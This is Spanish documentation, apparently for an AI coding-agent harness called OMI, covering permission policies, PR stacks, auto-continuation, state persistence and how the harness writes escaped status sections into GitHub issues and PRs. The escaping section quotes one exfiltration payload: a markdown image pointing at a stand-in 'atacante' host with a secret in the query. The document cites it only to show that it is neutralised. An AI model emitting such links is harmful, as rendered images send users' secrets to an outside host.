- No es una frontera de seguridad: el registro local lo puede editar cualquier proceso con tu usuario.
- Por defecto el agente tiene mucho poder: sin Foundations v2 arranca, se aprueba la receta, corre cualquier comando y publica el PR draft sin preguntar. El aviso de cada revisión marca sus `auto`. Nunca mergea, fuerza un push, crea tags, lanza workflows ni despliega.
- `arranque: auto`, `receta: auto` y `push_pr: auto` tienen avisos explícitos; no dispensan restricciones independientes.
- Los globs son textuales, no un análisis de seguridad de scripts, ejecutables, wrappers, aliases o funciones. Un bloque inválido o v1 no vale: sin una v2 aceptada vale el default (todo `auto`), no un `ask`.
- Sin KB, una revisión aceptada vieja puede ser más o menos permisiva que la vigente.
- Revertir código/configuración no deshace efectos de comandos ya ejecutados; no se promete rollback externo.
- Un repo cuyo nombre no es un producto de la KB no tiene Foundations.
- Cada sesión en un repo de GitHub lee la KB: tres llamadas MCP. **r** en la pestaña OMI y cada guardado del setup releen: otras tres.

## Preguntas en tanda

OMI pregunta como AskUserQuestion de Claude Code: de 1 a 4 preguntas en una tanda, cada una con sus opciones numeradas y una descripción tenue debajo. La recomendada va primero, marcada «(Recomendada)», y recibe el cursor, pero nunca se elige sola. La última opción es siempre «Escribir otra respuesta»: abre un texto en la misma tanda y la respuesta vuelve marcada como escrita, no como una opción. Las preguntas internas de respuesta cerrada (una política es `ask` o `auto`) no la tienen.

```
── El agente pregunta ──────────────────────────────────────────
 ←  ■ Alcance   □ Riesgo   ✓ Enviar  →

 ¿Qué riesgo asumimos?

 › 1. Bajo (Recomendada)
      Sin migraciones ni contratos
   2. Alto
      Toca el contrato público
   3. Escribir otra respuesta
 1–3 eligen y siguen · Enter confirmar · Tab/←→ preguntas · Esc cancelar
```

- ↑/↓ mueven el cursor; un número elige esa opción y avanza. Enter confirma y pasa a la siguiente sin responder. Tab o ←/→ cambian de pregunta.
- Elección múltiple: casillas; Espacio o un número marcan, Enter confirma lo marcado (también nada).
- Con más de una pregunta, el paso **Enviar** repasa todas las respuestas antes de mandarlas. Si falta alguna, Enter vuelve a la primera sin responder.
- Esc cancela la tanda: no quedan respuestas parciales ni consentimiento. En el texto libre, Esc sólo vuelve a las opciones.
- Una pregunta sin recomendada, como el sí de un permiso de comando, arranca sin cursor: Enter solo no elige nada, y un número sólo lleva el cursor. Elegir pide Enter.
- Va en el lugar del editor, dentro del layout del workspace. Si no entra, primero esconde las descripciones de las otras opciones y después desplaza la lista, sin tapar la ayuda. Un texto largo, como el detalle de un permiso, se desplaza con PgUp/PgDn.

El agente pregunta así con `omi_ask`: `questions` de 1 a 4, cada una con `question`, `header` (hasta 12 caracteres), `options` de 2 a 4 (`label` y `description`, la primera es la recomendada) y `multiSelect`. OMI agrega la respuesta libre. Devuelve, por pregunta, su id (`q1`…), el texto, las opciones elegidas (`options`) y lo escrito (`text`); al cancelar, `cancelled`, y el turno termina. En modo print, RPC o sin UI no se le ofrece al modelo; si llega igual, falla con un error: nunca supone una respuesta. Es `model-only`: ni `codemode` ni un subagente la pueden llamar.

## Stack de PRs

Un trabajo grande puede terminar en varios PRs encadenados (un **stack**) en vez de un PR enorme. Cada PR se revisa y se mergea por separado.

### Cuándo partir

Lo decide el agente al escribir la spec (ruta Con spec) y lo aprueba la persona con la receta. Conviene cuando el cambio no se revisa bien en un solo PR. Ejemplos: más de unas 400 líneas de diff, o partes que se revisan y mergean por separado (modelo, lógica, UI). Cada PR tiene que pasar sus tests solo. Sin stack, el trabajo va en un solo PR, como siempre. Directa tiene un solo paso: siempre un PR.

Con un [lifecycle](#review-land-y-ship) aceptado que encadena la entrada (`continuity.entry` en `auto` o `ask`), el trabajo va en un solo PR: la cadena adopta un PR y no adopta stacks. La guía de la receta y de la spec se lo dice al agente, y `specified` con `stack` falla sin registrar nada ni tocar GitHub. El error le pide mandar `specified` otra vez sin `stack`, con los mismos pasos C. Si la configuración no se puede leer (KB caída, cambios sin aceptar, sin configurar u `--offline`), vale lo de siempre: el stack se permite. Con `entry: manual` o sin `continuity`, también.

### Cómo se declara

En `specified`, junto a los pasos, `stack` agrupa los pasos C en PRs:

```json
{
  "why": "Se revisa mejor por partes",
  "steps": [
    { "id": "C1", "title": "Modelo", "cases": ["D1"] },
    { "id": "C2", "title": "Estado", "cases": ["D1"] },
    { "id": "C3", "title": "Vista", "cases": ["D2"] }
  ],
  "playbook": ["Probar el flujo completo"],
  "stack": [
    { "title": "Modelo y estado", "steps": ["C1", "C2"] },
    { "title": "Vista", "steps": ["C3"] }
  ]
}
```

- De 2 a 10 grupos. Cada uno lleva `title` (qué entrega) y sus pasos.
- Los grupos son contiguos, van en orden y cubren cada paso una vez: cortan la secuencia C1…Cn. `[C1, C3], [C2]` se rechaza, porque cada rama apunta al commit del último paso de su grupo.
- El stack es parte de la spec: la aprobación lo cubre y la revisión de la receta lo muestra en Pasos. Cambiarlo es otra receta.
- Un paso de corrección de una vuelta (`retry`) va en el último PR.
- Un estado guardado sin `stack` sigue igual: un solo PR.

### Cómo se publica

`publish` abre un PR draft por grupo, en orden, con la política del push: con `push_pr: auto` (el default) no pregunta; con `push_pr: ask` pide un solo sí para todo el stack. Ejemplo con la receta de arriba y la rama `feat/issue-46`:

| PR | Rama | Base | Commit | Cierra |
|---|---|---|---|---|
| 1 | `feat/issue-46-1` | `main` | el de C2 | no: `Refs #46` |
| 2 | `feat/issue-46-2` | `feat/issue-46-1` | el de C3, el HEAD verificado | sí: `Closes #46` |

- Cada PR pasa las mismas validaciones que el PR único: aprobación vigente, HEAD verificado y limpio, repo y `origin`, pedido sin cambios, hash del recibo y recuperación sin duplicar. Antes de escribir se arman todos los cuerpos (si uno no entra en GitHub, no se abre ninguno) y se comprueba que cada commit esté debajo del de arriba.
- Push normal del SHA de cada grupo a su rama, sin force ni tags. La rama del worktree no se sube.
- Título: `<título del PR> · PR k/n: <título del grupo>`, con el tipo una sola vez, al principio (ver «Título del PR draft»). Ejemplo: `feat: Trabajo grande · PR 1/2: Modelo`.
- El cuerpo es el mismo Markdown del PR único (ver «Cuerpo del PR draft»), con su encabezado propio: `Refs #N` o `Closes #N` y la línea del stack. Ejemplo: ``Stack: PR 2 de 2 · pasos C3 · sobre #123 (rama `feat/issue-46-1`)``. El texto de cada PR dice si cierra el issue o no.
- Sólo el último PR cierra el issue (`Closes #N`); los de abajo lo referencian (`Refs #N`). GitHub lo cierra cuando ese PR entra en `main`.
- Si la publicación se corta a mitad, volver a publicar recupera los PRs ya abiertos (por rama, base, head y cuerpo exactos) y sigue con el que falta. Un PR ajeno en una rama del stack frena; los de abajo ya abiertos quedan.

### Cómo se ve

La sección del issue suma **Stack de PRs**: cada PR con su número (link), base, pasos y estado (`sin abrir`, `draft`, `abierto` o `mergeado`). Antes de publicar muestra el plan. El progreso (pantalla 6 y `/omi-progress`) y la revisión de la receta muestran las mismas líneas en texto plano.

```
### Stack de PRs
- **PR 1 de 2** · https://github.com/chichex/omi-code/pull/123 · base `main` · pasos C1, C2 · draft · Modelo y estado
- **PR 2 de 2** · https://github.com/chichex/omi-code/pull/124 · base `feat/issue-46-1` (#123) · pasos C3 · draft · Vista
```

### Cómo se actualiza

`/omi-work stack` (o el agente, con `omi_workflow` `action: "stack"`) deja el stack al día. Sigue la política del push: con `push_pr: auto` no pregunta y avisa qué hace; con `push_pr: ask` pide el sí antes de leer GitHub. Lee cada PR en GitHub y va de abajo hacia arriba:

- **Cambió el de abajo.** Ejemplo: una persona sube un commit de review a `…-1`. Lo mergea en `…-2` con un commit de merge y hace push normal de `…-2`. Sigue hacia arriba: `…-2` en `…-3`, y así.
- **El de abajo se mergeó a `main`**, también con squash. Al de arriba le mergea `main` y lo re-apunta con `gh pr edit --base main`. El merge usa como base la punta final del PR mergeado: así sus propios cambios, que `main` trae aplastados en un commit, no chocan. Ejemplo: C3 cambia una línea que agregó C1; un `git merge main` común chocaría, este no.
- **Nada cambió:** no escribe nada y lo dice. Correrlo otra vez no repite nada.

Nunca rebase ni force push, nunca mergea un PR, nunca corre workflows. Los merges se calculan con `git merge-tree` y `git commit-tree`: no tocan el worktree ni su índice. Todo se calcula antes de la primera escritura en GitHub.

Frena y pide una persona si:

- un merge tiene conflicto: se resuelve a mano con `git merge`, se sube y se vuelve a correr;
- un PR del stack está cerrado sin mergear, o se mergeó en una rama que no es `main`;
- una rama del stack se reescribió (ya no contiene el commit publicado);
- GitHub rechaza el push (la rama cambió mientras tanto o está protegida). Si ya había subido un PR de abajo, esa rama queda bien: volver a correr sigue desde ahí.

### Límites

- Sólo la ruta Con spec arma un stack. La base es siempre `main`, como en el PR único.
- El harness no implementa los cambios de review de un PR de abajo: los hace una persona (u otro trabajo) y el harness los propaga hacia arriba.
- Un paso de corrección de una vuelta va al último PR, aunque arregle algo de uno de abajo.
- Si `main` avanza, no se mergea en el PR 1 ni en los que ya están sobre `main`: eso sigue el flujo normal de GitHub.
- El merge con base fija necesita Git 2.40 o superior.
- No hay lock con GitHub: otro puede escribir entre la lectura y el push. El push normal lo rechaza y se vuelve a correr.
- La línea «sobre #N» del cuerpo queda como al abrir el PR. La base vigente la muestran GitHub y la sección del issue.
- El lifecycle no adopta un stack. Si igual se publica uno con la entrada encadenada (por ejemplo, la configuración se aceptó después de la spec), la cadena pausa sin preguntar ni leer GitHub: «Continuidad en pausa · Este trabajo se publicó como stack de 2 PRs y el lifecycle no adopta stacks: mergealos en orden con su sí». `/omi-work adopt` falla con el mismo motivo. `/omi-work status` y el panel tampoco mandan a adopt: dan el mismo próximo paso.

## Si el modelo corta solo

Un modelo a veces cierra el turno con el trabajo a medio hacer. Por ejemplo: «C12 sigue incompleto» y nada más. Antes el harness quedaba quieto hasta que la persona escribiera.

Ahora, antes de que Pi dé por terminada la corrida, OMI le agrega un mensaje propio (`omi-development-continue`) y la corrida sigue: «El trabajo #N sigue en «Implementar» y nadie lo pausó: seguí con el próximo paso». No es un mensaje de la persona: no vale como cita ni como permiso.

Retoma sólo si se cumple todo esto:

- La corrida terminó bien: no con Esc ni con un error.
- El trabajo está activo, sin pausa, espera ni bloqueo, en una etapa del modelo: explorar, resolver inferencias, receta, diagnóstico, spec, implementar, verificar o abrir el PR draft. Aprobar la receta, Review, Land y Ship esperan a la persona.
- Ninguna tool del harness cerró el turno a propósito, por ejemplo al pausar, publicar el PR o recibir un no.
- No hay subagentes en background corriendo: su aviso ya relanza el turno.

Tope: dos vueltas seguidas sin que el estado durable avance. A la tercera frena y avisa «El modelo cortó dos veces sin avanzar el trabajo #N». Avanzar una etapa o un mensaje de la persona renuevan el tope.

Los avisos de subagentes en background también cambiaron. Si un trabajo termina con el agente corriendo, su aviso espera al cierre del turno. Si el modelo ya leyó el resultado con `action:result`, no hay aviso ni turno nuevo. Varios terminados van en un solo aviso. Antes cada aviso viejo abría su propio turno: en el #69 fueron 16 avisos, 38 llamadas y 16,7 M tokens.

## Persistencia, sesiones y recuperación

El trabajo se guarda en `<git-common-dir>/omi/development/N.json`, separado de `.omi/project.json` y del registro de preparación del worktree (`<git-common-dir>/omi/issue-workspaces/N.json`). No requiere vincular el repo a un proyecto de infraestructura OMI.

- Esquema versionado, identidad completa de issue/checkout/base, revisión optimista, archivo 0600, escritura atómica y lock exclusivo con PID/host.
- No se siguen symlinks para el estado. Registro corrupto, recurso perdido o checkout ajeno no se reemplazan automáticamente.
- Los locks abandonados del estado no se roban por antigüedad ni por un PID. Una persona verifica el proceso/host antes de retirarlos. El turno de checks es otra cosa: es cortesía y se retira solo (ver [Cola de checks y timeouts](#cola-de-checks-y-timeouts)).
- La conversación guarda un vínculo al trabajo y a su revisión. Una rama de conversación atrasada no adopta silenciosamente cambios de otra ventana; exige `resume`.
- La rama también guarda las tools normales del chat mientras el harness las restringe. `/omi-work stop` las devuelve aunque la sesión se haya retomado, recargado o movido por el árbol, y retomar después de salir no vuelve a las restringidas. Al volver a abrir, `--tools`, `--exclude-tools` o una extensión desactivada prevalecen sobre lo guardado, con las reglas con que Pi retoma una sesión.
- Las tareas de subagentes siguen siendo efímeras. Lo durable es el trabajo, no un proceso vivo ni un job remoto.

Los cambios externos del filesystem no se revierten. Una operación ejecutada sin recibo por cierre abrupto requiere inspección y revalidación, no replay automático.

### Compatibilidad con binarios anteriores

El esquema del estado no admite campos desconocidos. Un estado escrito por esta versión puede no abrir en un binario anterior:

| Estado | Binario anterior |
|---|---|
| Una review de Seguridad con `severities` (un `fail` con algún aviso, también uno bajado por convergencia) | No lo abre. Tampoco después de un `retry`: la review pasa al archivo de intentos con su lista |
| Una review de Seguridad con `partial` (un `fail` con alguna parte sin juicio) | No lo abre, igual que con `severities`. Casi siempre trae `severities`: una parte sin resultado deja su aviso. Llega sin `severities` en dos casos: una parte `unknown` sin hallazgos junto a blockers, o un `unknown` que un blocker marcado volvió `fail` y que sólo trae blockers |
| `acceptedRisks` (una persona aceptó un riesgo en esta vuelta) | No lo abre. Después de un `retry`, `refresh` o `replan` el campo desaparece y vuelve a abrir, si ninguna review tiene `severities` |
| `maxRounds` sumado con `/omi-work extra-round` | Lo abre: no hay campo nuevo |
| Un amend por un D o un gate rojo | Lo abre: la entrada de `amends` tiene la misma forma |
| El turno de checks (`check-turn.lock`) | No lo conoce: corre sin turno |

Si no lo abre, queda en «Estado del harness inválido; no se reemplaza ni se reinicia automáticamente», en sólo lectura, y se sale con `/omi-work stop`. No corrompe nada: se resuelve actualizando (`omi upgrade` sólo sube). No alternar binarios con un trabajo así. Es el mismo precedente que `amends` y `noResult`. Por eso `severities` se guarda sólo cuando hace falta y `MAX_AMENDS` sigue en 2: con 3, un binario anterior rechazaría el estado.

En el otro sentido, todo estado anterior carga y se retoma. Una review de Seguridad guardada sin `severities` conserva la semántica vieja: sus hallazgos son blocker. Ejemplo: #98 carga en Verificar, pausado; su `fail` de Seguridad sigue bloqueando y `amend` se rechaza con «hay un blocker de security…». Con `/omi-work accept-risk` o un `retry`, sigue.

## GitHub sin sobrescribir el pedido

Crear el issue de un pedido nuevo es la única escritura en GitHub antes de Explorar. Pasa después de clasificar y decidir harness, una vez, con el título y el cuerpo del pedido: sin preguntar por defecto, o sólo con el sí si Foundations dice `arranque: ask`. Si GitHub no confirma la creación, no se reintenta: hay que revisar el repo antes de volver a pedirlo, para no duplicarlo.

El harness no crea comentarios en el issue. Su estado va en una **sección administrada al final del cuerpo**, entre `<!-- omi:harness:start -->` y `<!-- omi:harness:end -->`. El pedido humano queda arriba, intacto byte a byte. La sección es markdown: ruta y etapa, receta con sus casos D, pasos, decisiones, acuerdos del chat, una tabla de evidencia (caso, resultado, HEAD), los avisos de los lentes con sus hallazgos (los de Seguridad, con `blocker ·` o `aviso ·` adelante) y, si una persona aceptó un riesgo, **Riesgos aceptados por una persona**: cada contenido con su fecha, su motivo y sus hallazgos. Ejemplo:

```
## Harness · #45
**Ruta:** Con spec · **Etapa:** Implementar (C2 de 3)

### Receta
- **Objetivo:** …
- **D1** `npm test` · Tests del repo

### Evidencia
| Caso | Resultado | HEAD |
|---|---|---|
| D1 | ✅ exit 0 | cae0b33 |
```

- **Cuándo se escribe:** al aprobar una receta, al registrar un acuerdo, al abrir el PR draft (o el stack) y al actualizar un stack que cambió. Nunca antes del primer sí a una receta: sin receta aprobada sólo se actualiza una sección que ya existe. Por ejemplo, tras un acuerdo que rehace la receta, la sección se actualiza enseguida y muestra la receta «en revisión» hasta el nuevo sí. Si no se puede escribir (sin red, límite de GitHub, marcadores rotos), OMI avisa y el trabajo sigue: el estado local es la fuente de verdad.
- **Cómo se escribe:** se relee el cuerpo justo antes de escribir y se reemplaza sólo lo que está entre los marcadores. Sin marcadores, la sección se agrega al final. No se escribe si el pedido cambió desde el último contraste, y la escritura se confirma releyendo; no se reintenta sola. Una sección igual no se vuelve a escribir.
- **Riesgo residual:** GitHub no ofrece CAS para el cuerpo del issue. Una edición humana que cae entre esa relectura y la escritura se pierde del cuerpo; GitHub la conserva en el historial de ediciones del issue.
- **Marcadores:** sólo cuentan solos en su línea, desde la primera columna y fuera de un bloque de código cercado. Una mención en el pedido (en línea, entre backticks, indentada o dentro de una cerca ```` ``` ```` o `~~~`) es texto humano. Ejemplo: un pedido que muestra el par de marcadores en un bloque de código no se pisa, sigue en el pedido que se contrasta y no frena los puntos de control. La cerca cierra con su mismo carácter y al menos su largo; una cerca sin cerrar no esconde marcadores, así la sección que OMI agrega después se sigue encontrando. Marcadores repetidos, sueltos, invertidos o desconocidos fuera de un bloque no se adivinan: OMI no escribe ni contrasta el pedido (los puntos de control fallan) y pide dejar un solo par o borrar la sección. Un par bien formado escrito por una persona fuera de un bloque se toma como la sección.
- **Qué cuenta como pedido:** todo lo de fuera de los marcadores, también lo que alguien agregue debajo. Lo de adentro se reescribe entero: lo que se edite ahí se pierde y no invalida el trabajo.
- **Escape:** los datos de la receta, del agente, de los comandos y de la persona no pueden romper la tabla, los bloques de código ni los marcadores. Los backticks y pipes de un comando quedan dentro del código, un comando multilínea va en un bloque con una cerca más larga, el HTML se escapa y los controles e invisibles se muestran como `\uXXXX`.
- **Nada queda activo:** ese texto no puede dejar en GitHub imágenes, links, autolinks, HTML, menciones ni referencias. Una palabra con URL, `www.`, correo, `@usuario`, `#123` o `GH-123` va entera como código, y los corchetes y backticks sueltos se escapan. Ejemplo: un acuerdo `![x](https://atacante/?d=SECRETO)` se ve como código y GitHub no carga la imagen. Vale también para las citas de la persona. El único link es el del PR draft que validó el harness.
- **Salida de comandos:** la sección lleva exit code y HEAD, no la salida, que queda sólo en el estado local porque nadie la revisa antes de publicar.
- **Comentarios viejos:** los que dejaron versiones anteriores quedan en GitHub; OMI no los borra ni los edita.

El cuerpo de un issue admite 65.536 caracteres. Si el pedido más la sección no entran, la sección se resume y lo dice en un aviso al principio: primero la evidencia queda con la última prueba de cada caso y cada lente con su primer hallazgo; si tampoco entra, queda una sección mínima (ruta, etapa, veredictos de los lentes y cada riesgo aceptado con su contenido, fecha y motivo) que nombra lo que omite. Nada se corta en silencio y el pedido nunca se toca. Si ni la mínima entra, no se escribe y OMI avisa.

### Título del PR draft

El título del PR es un commit convencional. Al mergear con squash, GitHub usa el título del PR como asunto del commit en `main`. Un release continuo decide la versión por ese asunto. Ejemplo, en omi-code: `feat:` sube el minor y `fix:`, el patch.

- **Tipo de la receta aprobada.** Va adelante del título del issue. Nueva capacidad y Mejora son `feat:`, porque cambian lo que se ve; Fix es `fix:` y Chore, `chore:`. Ejemplo: el issue «Guiar la configuración de Foundations y lifecycle en la TUI», con una receta de Nueva capacidad, abre `feat: Guiar la configuración de Foundations y lifecycle en la TUI`.
- **Manda la receta, no la rama.** Es el tipo que aprobó la persona y el que muestra el cuerpo del PR. Ejemplo: una rama `feat/issue-46` cuya receta quedó como Fix abre `fix: …`.
- **Un título que ya es convencional queda igual.** Vale con los tipos y el formato del gate de commits: `tipo(scope)?!?: resumen`, scope en minúsculas. Ejemplo: `fix(harness): PRs en Markdown` no cambia. `Fix: algo` no es convencional: con una receta de Fix abre `fix: Fix: algo`.
- **Sin receta**, el título es el del issue, como antes.
- **Stack:** el tipo va una vez, al principio del título completo (ver «Stack de PRs»).
- **Fix-forward:** siempre `fix:`, porque corrige un PR ya mergeado. Se saca el tipo, el scope y el `!` del título del issue. Ejemplo: `feat(tienda)!: Cambio` abre `fix: Cambio`. El recibo del fix-forward sigue guardando el título del issue.
- **Máximo 256 caracteres,** el límite de GitHub. Si el tipo lo pasa, se recorta el final del resumen con «…» y se conservan el tipo y, en un stack, ` · PR k/n: <grupo>`. Ejemplo: un issue de 256 caracteres con receta Fix abre `fix: ` más los primeros 250 y «…».
- **Recuperar no compara títulos.** Un draft que abrió una versión anterior con el título del issue se recupera igual y no se renombra. En un stack a medias, sólo el PR que falta sale con el título nuevo.
- **Límite:** con la opción de GitHub «título del commit o del PR» para el squash, un PR de un solo commit toma el asunto de ese commit, no el título del PR.

### Cuerpo del PR draft

El PR draft lleva su propio cuerpo, en Markdown legible. No es la sección del issue: trae también la receta completa, las inferencias y la evidencia. Ejemplo, recortado:

````md
<!-- omi-development:pr identity=… source=… head=… artifact=… -->
Closes #60

_PR draft preparado por OMI para el issue #60. Requiere revisión humana y nunca se mergea solo. Crear el draft no cierra el issue: GitHub lo cierra cuando una persona mergea este PR a la rama default._

## Resumen
- **Issue:** #60 · Corregir el formato de los PRs del harness
- **Etapa:** Abrir PR draft · **Estado:** activo

## Verificación
| Caso | Comando | Resultado | HEAD |
|---|---|---|---|
| **D1** Renderer | `npm test` | ✅ exit 0 | `1919141` |
| **D2** Sesión | `node --test test/x.test.ts` | ⬜ sin correr | — |

## Advertencias
- **Lentes:** asesoran; …
  - **Seguridad:** ⚠️ unknown

<details>
<summary>Receta, spec y playbook</summary>
…
</details>
````

- **Arriba, lo que se revisa:** resumen, alcance (con los pasos y sus commits), verificación y advertencias. La verificación lista cada caso D con su última corrida y cada gate con la suya. Un caso que no corrió dice `⬜ sin correr`, no se muestra como pasado. Lleva exit code y HEAD, nunca la salida de los comandos. Si una persona aceptó un riesgo, después de Advertencias va **## Riesgos aceptados por una persona**, con cada contenido, fecha, motivo y hallazgos; sin aceptaciones, el cuerpo queda igual que antes.
- **En `<details>`:** receta, spec y playbook; inferencias y respuestas; acuerdos del chat; la evidencia completa (reproducción, rojo, verde, verificación y gates); las revisiones de los lentes y el pedido original.
- **Sin JSON y nada activo:** los datos pasan por el mismo escape que la sección del issue: no enlazan, no mencionan ni referencian. El pedido es Markdown de una persona: va citado en un bloque de código, con una cerca más larga que cualquier racha de backticks. Ejemplo: un pedido con `Closes #999` o `@octocat` se ve tal cual y no cierra ni avisa nada. Un `</details>` de los datos no cierra una sección y un `<!-- omi-development:` de los datos no imita el marcador.
- **Cierre del issue:** la segunda línea es `Closes #N`, sólo para el issue del trabajo, validado como del mismo repo que el PR (origin y `gh` apuntan ahí). Va fuera de citas y bloques. En un stack la lleva sólo el último PR; los de abajo llevan `Refs #N` (ver «Stack de PRs»). Crear el draft no cierra nada: GitHub cierra el issue cuando una persona mergea el PR a la rama default. OMI no corre `gh issue close` ni mergea, y no hay soporte entre repos.
- **Límite:** GitHub admite 65.536 caracteres. OMI mide bytes UTF-8 y cuenta el marcador más largo posible. Evidencia, avisos y revisiones se acotan por líneas enteras y lo dicen (`Presentación acotada: se muestran N de M …`). Receta, spec, inferencias, acuerdos y pedido van enteros, o falla pidiendo dividir la tarea.
- **Hash:** el recibo pendiente guarda el hash del cuerpo del PR único, todo lo que sigue al marcador, `Closes` incluido. El marcador liga trabajo, pedido, HEAD y ese recibo, y su `artifact=` es el hash de todo lo que le sigue en ese PR. En el PR único los dos coinciden. En un stack, cada PR cambia sólo su encabezado, que sale del stack del recibo y del número del PR de abajo, y la recuperación compara su cuerpo exacto.

### Publicar y recuperar

- **El sí es sobre el cuerpo exacto.** Con `push_pr: ask`, la TUI abre la revisión navegable (secciones Publicación y Cuerpo del PR) y RPC trae el cuerpo entero en el diálogo. Es el mismo texto que recibe `gh`. Sin UI interactiva falla sin efectos. Con `push_pr: auto` publica sin preguntar y avisa qué hizo. Si el trabajo cambió en otra ventana durante la revisión, el sí no vale.
- **Recibo y SHA:** la publicación guarda un recibo pendiente antes del push, valida repositorio/origin/branch y usa el SHA inmutable aprobado, sin force ni tags. Recupera sólo un draft abierto de esa rama/base/SHA con identidad y cuerpo exactos de este trabajo.
- **Recibo de un cuerpo anterior:** un recibo pendiente cuyo hash no es el del cuerpo actual nunca se publica con ese cuerpo. Ejemplo: el de una versión de OMI con el formato viejo (`Refs #N` y JSON). Retomar no lo migra ni lo publica. Al publicar, OMI regenera el cuerpo y sigue la política `push_pr` vigente: con `ask` muestra el cuerpo nuevo entero y pide el sí (un no deja el recibo como estaba); con `auto` lo renueva y publica sin preguntar. La renovación nombra el recibo que reemplaza y exige el mismo HEAD.
- **PR ya abierto:** un PR ajeno, editado por una persona o de una publicación anterior con otro cuerpo requiere intervención: no se edita, no se cierra ni se duplica. Ejemplo: un draft abierto con el formato viejo bloquea la publicación hasta que una persona lo resuelva en GitHub.
- **Efectos que no se revierten solos:** revertir el código de OMI no borra cuerpos ya publicados ni reabre un issue que GitHub cerró al mergear. Eso es una intervención humana aparte.

No hay garantía de atomicidad entre cambios humanos del issue y todas las acciones posteriores de Git/GitHub. Los checkpoints detectan cambios; no hay lock distribuido sobre la intención de la persona.

## Review, Land y Ship

El PR draft es el final por defecto. Para seguir el mismo trabajo se puede habilitar continuidad explícita en la configuración aceptada, o usar los comandos manuales. La continuidad la ejecuta el host: el agente no tiene tools para estos efectos; ni `bash` ni `omi_workflow` reservan, mergean, despachan ni despliegan.

Después del draft, el agente no corre Review, Land ni Ship: se los pasa a la persona como comandos `/omi-work`, nunca como comandos de terminal ni disparando workflows. Su contexto, el motivo de una tool bloqueada y el error de `omi_workflow_check` dicen quién corre cada efecto y el **próximo paso** del estado. Un `!comando` de la persona tampoco corre: el aviso le da ese próximo paso y `/omi-work stop` para salir del flujo, sin mandarla a `omi_workflow_check`. El próximo paso es el de la pausa de la continuidad, si hay una vigente. Si no, sale del estado guardado como lo elegiría la cadena, sin repetir una Review ya registrada. Ejemplos:

```text
PR draft abierto, sin adoptar  → corré /omi-work adopt y después /omi-work review; si la continuidad está configurada, adopt ya sigue con la Review
PR adoptado, sin Review        → corré /omi-work review
Review registrada, 1 hallazgo  → corré /omi-work fix; usa los hallazgos ya registrados
Pausa por un no a la Review    → cuando quieras, /omi-work review
Stack publicado               → mergealos en orden con su sí
```

Con un stack publicado, la guía no ofrece `/omi-work adopt` ni `/omi-work review`, tampoco para una Review con GHA: el lifecycle no adopta stacks y adopt lo rechaza.

Con el PR adoptado, la guía ofrece `/omi-work review` sólo en la etapa Review, que es donde corre. Con el merge observado (Ship, entrega verificada o cerrada) dice que el PR ya está mergeado y la Review no aplica. En otra etapa (Correcciones, Listo para merge, Land) dice que la Review no corre ahí y manda al próximo paso. Ejemplo: en Ship, «revisá el PR» no termina en un `/omi-work review` que falla con «Review corre en la etapa Review; ahora: ship».

Si falta configurar algo que corre el [setup](#setup-de-lo-que-falta) (por ejemplo, el lifecycle), el contexto del agente lo dice y el agente le pasa `/omi-setup` a la persona: no lo configura ni edita la KB.

Caso real: la persona pidió «corré las reviews con GHA» y el agente le pasó un `gh workflow run`. Ahora la respuesta es `/omi-work adopt` y `/omi-work review`: con Review `gha`, OMI dispara el workflow configurado con su permiso (en `chichex/omi-code`, siempre con el sí de la persona). Con el PR adoptado y `continuity.fix` en `auto` o `ask`, el agente no pide `/omi-work fix` para el push: la cadena lo hace al marcar `verified`, con el permiso `push_pr` de Foundations. Con `fix: manual` o sin continuidad, sí lo pide.

| Comando | Qué hace | Permiso |
|---|---|---|
| `/omi-work adopt` | Habilita el lifecycle sobre el PR draft abierto: relee el PR en GitHub y el checkout, fija la configuración aceptada. Con `continuity.review` en `auto` o `ask`, el diálogo avisa que después sigue la Review | Siempre un sí |
| `/omi-work review` | Corre la Review configurada: `github` lee reviews, comentarios y checks; `local` usa un revisor aislado; `gha` dispara el workflow y espera su recibo, con `model` y `effort` sólo si el provider los fija. Con `github`, volver a correrlo en el mismo HEAD sólo relee: no pregunta ni gasta otro intento | `review.mode` |
| `/omi-work fix` | Agrupa los hallazgos del HEAD actual y abre una ronda: el agente corrige con rojo, verde, commit y todos los D. Al terminar, verifica y hace push al **mismo PR** | El comando manual pide un sí para la ronda y otro para el push, con o sin continuidad. Sólo el push que hace la cadena, con `continuity.fix` en `auto` o `ask`, sigue la política independiente `push_pr` de Foundations |
| `/omi-work land` | Marca el PR listo (sale de draft), relee checks, reviews y reglas, y mergea por PR y SHA. Reconoce un merge externo | `land.mode` |
| `/omi-work ship` | Verifica cada destino aceptado con recibos y provenance; termina en Entregado sólo si todos se verifican. Si el PR se adoptó sin Ship, primero toma la revisión aceptada vigente: así sirve después de `/omi-setup` | `mode` de cada destino |

Por defecto los permisos de cada efecto son `ask`; no implican continuidad entre etapas. En `chichex/omi-code`, el merge y cualquier dispatch son siempre humanos, aunque la configuración diga `auto`. Cada efecto pasa por el coordinador raíz: actividad, decisión, reserva, una sola invocación y recibo. Un resultado incierto queda como incierto y no se repite solo. Restaurar, recargar o moverse por el árbol de la sesión no ejecuta nada.

Ejemplo, con Review por GitHub y Ship por una release:

```text
/omi-work adopt    → sí · Review del PR
/omi-work review   → sí · 1 hallazgo: «Falta cubrir el valor 3»
/omi-work fix      → sí · el agente corrige (paso C2) y marca verified
/omi-work fix      → sí al push · mismo PR, HEAD nuevo
/omi-work review   → sí · aprobado, sin hallazgos nuevos
/omi-work land     → sí a «listo para review» · sí al merge
/omi-work ship     → sí · release v0.2.0 verificada · Entrega verificada
```

Un comentario ya corregido que la Review vuelve a ver en el HEAD nuevo se confirma con `/omi-work fix` («Ya corregidos»), sin gastar otra ronda. Con continuidad, confirmarlos es progreso. Si quedan hallazgos nuevos, la cadena sigue con una ronda sólo para ellos, con su propio sí «Corregir N hallazgo(s)»; sin rondas, pausa por rondas. Con `corrections.mode: auto`, la cadena no abre «Ya corregidos»: con rondas, entran en la ronda nueva; sin rondas, pausa por rondas sin pedir «Continuidad · Corregir» y `/omi-work fix` los confirma a mano. Si `/omi-work fix` los confirma todos y esta sesión ya observó la Review de ese HEAD, la cadena sigue con Land sin repetirla. Si confirma una parte, `continuity.fix` está en `auto` o `ask` y esta sesión observó la Review de ese HEAD, el aviso dice que la continuidad sigue con la corrección de los que quedan. Si no (con `fix: manual`, o con la sesión recargada o reabierta), dice que hace falta otro `/omi-work fix`, igual que la pausa. Land no avanza con hallazgos pendientes ni operaciones inciertas. Un merge no es una entrega: Ship la verifica después. Ship `not-applicable` termina sin entrega y `manual` queda como entrega declarada, nunca como Entrega verificada.

